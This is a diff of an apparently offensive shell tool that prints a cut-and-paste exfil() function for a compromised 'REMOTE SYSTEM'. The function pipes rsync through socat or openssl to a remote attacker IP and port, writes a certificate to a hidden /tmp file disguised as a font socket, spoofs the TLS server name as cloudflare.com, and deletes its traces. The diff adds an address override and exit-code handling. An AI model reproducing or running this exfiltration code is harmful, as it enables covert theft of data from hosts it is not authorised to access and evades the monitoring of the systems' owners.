@@ -29,13 +29,13 @@ Cut & paste the following lines into the REMOTE SYSTEM:${CF}
 ${CM}${CF}SF_EXFIL_PEM=\"$(<"$pemfn")\"
 exfil() {
     local fn=\"/tmp/.font-unix-ex\"
-    local concmd opts
+    local concmd opts rv
     command -v socat &>/dev/null && {
-        concmd=\"socat - OPENSSL-CONNECT:${RIP:?}:${RPORT:?}\"
+        concmd=\"socat - OPENSSL-CONNECT:\${IPPORT:-${RIP:?}:${RPORT:?}}\"
         concmd+=\",cert=\$fn,cafile=\$fn,verify=0\"
     }
     command -v openssl &>/dev/null && {
-        concmd=\"openssl s_client -connect ${RIP:?}:${RPORT:?}\"
+        concmd=\"openssl s_client -connect \${IPPORT:-${RIP:?}:${RPORT:?}}\"
         concmd+=\" -servername cloudflare.com -cert \$fn\"
         concmd+=\" -CAfile \$fn -quiet\"
     }
@@ -45,7 +45,9 @@ exfil() {
     opts=(-ahR${OPT} --partial --info=progress2 --size-only -e \"sh -c 'exec \$concmd' #\")
     [ \$# -eq 0 ] && opts+=(--files-from - . -0)
     rsync \"\${opts[@]}\" -- \"\$@\" 0:
+    rv=\$?
     rm -f \"\${fn:?}\"
+    return \"\${rv}\"
 }${CN}${CF}
 ########[[ ${CDR}DO NOT CUT & PASTE BEYOND THIS POINT${CN}${CF} ]]##############################
 ${CN}To exfil data from the REMOTE SYSTEM type the following on the REMOTE SYSTEM:
